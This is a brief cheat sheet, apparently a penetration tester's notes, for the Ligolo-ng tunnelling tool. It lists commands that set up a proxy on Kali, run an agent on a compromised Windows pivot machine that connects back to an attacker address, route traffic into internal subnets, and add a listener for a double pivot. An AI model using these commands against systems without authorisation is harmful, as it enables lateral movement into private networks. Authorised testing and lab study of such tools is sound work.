# Name
Ligolo-ng

## Usage
```
On Kali:
    sudo ip tuntap add user root mode tun ligolo
    sudo ip link set ligolo up
    ./proxy_linux64 -selfcert -laddr 0.0.0.0:443 

    After client connects:
        In Ligolo-ng session: ifconfig
        In Kali terminal: sudo ip route add <internal-subnet> dev ligolo

On pivot machine:
    .\agent_win64.exe -connect 192.168.45.227:443 -ignore-cert

Double pivot:
    In initial ligolo-ng session:
        listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80
```

## Source
https://github.com/nicocha30/ligolo-ng/releases/tag/v0.7.5
